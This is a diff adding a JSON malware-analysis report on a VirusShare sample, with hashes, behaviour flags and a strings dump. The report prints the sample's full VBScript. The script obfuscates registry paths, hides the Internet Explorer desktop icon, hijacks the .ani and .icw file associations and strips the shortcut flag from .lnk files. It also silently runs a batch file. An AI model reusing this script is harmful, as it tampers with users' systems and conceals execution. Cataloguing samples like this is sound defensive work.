@@ -1,0 +1,65 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AppActivate": "May control another application by simulating user keystrokes",
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "SendKeys": "May control another application by simulating user keystrokes",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "\nRem\nreg=\"{871\"&\"C53\"&\"80-42\"&\"A0-10\"&\"69-A2\"&\"EA-080\"&\"02B30309D}\"\nreg2=\"\"\nRegPath=\"HKEY_CURRENT_USER\\Soft\"&\"wa\"&\"r\"&\"e\\Mi\"&\"cro\"&\"soft\\Win\"&\"dows\\Current\"&\"Version\\Expl\"&\"orer\\HideDesktop\"&\"Icons\\New\"&\"Start\"&\"Panel\\\"&reg\nRegPath1=\"HKEY_CURRENT_USER\\So\"&\"ftwa\"&\"re\\Mic\"&\"rosoft\\Win\"&\"dows\\Cu\"&\"rrentVer\"&\"sion\\Exp\"&\"lorer\\Hide\"&\"DesktopIcons\\Clas\"&\"sicSt\"&\"art\"&\"Menu\\\"&reg\nRegPath2=\"HKEY_CLASSES_ROOT\\.ani\\\"&reg2\nRegPath3=\"HKEY_CLASSES_ROOT\\.icw\\\"&reg2\nType_Name=\"REG_DWORD\"\nType_Name2=\"REG_SZ\"\nKey_Data2=\"anifile\"\nKey_Data3=\"vbsfile\"\nWshShell.RegWrite RegPath2,Key_Data2,Type_Name2\nWshShell.RegWrite RegPath3,Key_Data3,Type_Name2\nKey_Data=1\nWshShell.RegWrite RegPath,Key_Data,Type_Name\nWshShell.RegWrite RegPath1,Key_Data,Type_Name\nSet WSHShell = WScript.CreateObject(\"WScript.Shell\") \nRegPath4=\"HKCR\\ln\"&\"kf\"&\"ile\\I\"&\"sS\"&\"hor\"&\"tCut\"\nWshShell.RegDelete(RegPath4)\nwscript.sleep 5000\ncreateobject(\"wscript.shell\").run \"\"\"C:\\Program Files\\Tencent\\QQ\\Users\\011110090\\44.bat\"\"\",0\nstrDesktop = WSHShell.SpecialFolders(\"Desktop\") \nWSHShell.AppActivate strDesktop \nWSHShell.SendKeys \"{F5}\" \n'600190011110090\nwscript.quit"
+    },
+    "filename": "VirusShare_3439c2f6e70b5ddab08d356df85df471",
+    "filesize": 1144,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3439c2f6e70b5ddab08d356df85df471",
+        "sha1": "33595a443a7ba2f217396c630d532f38f8c63f47",
+        "sha256": "abedcb4b77f8dae2ef5b0e0e4402b6058a08f60e4eb13a584411b0716aa2d727"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "reg=\"{871\"&\"C53\"&\"80-42\"&\"A0-10\"&\"69-A2\"&\"EA-080\"&\"02B30309D}\"",
+            "reg2=\"\"",
+            "RegPath=\"HKEY_CURRENT_USER\\Soft\"&\"wa\"&\"r\"&\"e\\Mi\"&\"cro\"&\"soft\\Win\"&\"dows\\Current\"&\"Version\\Expl\"&\"orer\\HideDesktop\"&\"Icons\\New\"&\"Start\"&\"Panel\\\"&reg",
+            "RegPath1=\"HKEY_CURRENT_USER\\So\"&\"ftwa\"&\"re\\Mic\"&\"rosoft\\Win\"&\"dows\\Cu\"&\"rrentVer\"&\"sion\\Exp\"&\"lorer\\Hide\"&\"DesktopIcons\\Clas\"&\"sicSt\"&\"art\"&\"Menu\\\"&reg",
+            "RegPath2=\"HKEY_CLASSES_ROOT\\.ani\\\"&reg2",
+            "RegPath3=\"HKEY_CLASSES_ROOT\\.icw\\\"&reg2",
+            "Type_Name=\"REG_DWORD\"",
+            "Type_Name2=\"REG_SZ\"",
+            "Key_Data2=\"anifile\"",
+            "Key_Data3=\"vbsfile\"",
+            "WshShell.RegWrite RegPath2,Key_Data2,Type_Name2",
+            "WshShell.RegWrite RegPath3,Key_Data3,Type_Name2",
+            "Key_Data=1",
+            "WshShell.RegWrite RegPath,Key_Data,Type_Name",
+            "WshShell.RegWrite RegPath1,Key_Data,Type_Name",
+            "Set WSHShell = WScript.CreateObject(\"WScript.Shell\") ",
+            "RegPath4=\"HKCR\\ln\"&\"kf\"&\"ile\\I\"&\"sS\"&\"hor\"&\"tCut\"",
+            "WshShell.RegDelete(RegPath4)",
+            "wscript.sleep 5000",
+            "createobject(\"wscript.shell\").run \"\"\"C:\\Program Files\\Tencent\\QQ\\Users\\011110090\\44.bat\"\"\",0",
+            "strDesktop = WSHShell.SpecialFolders(\"Desktop\") ",
+            "WSHShell.AppActivate strDesktop ",
+            "WSHShell.SendKeys \"{F5}\" ",
+            "'600190011110090",
+            "wscript.quit"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.285455",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
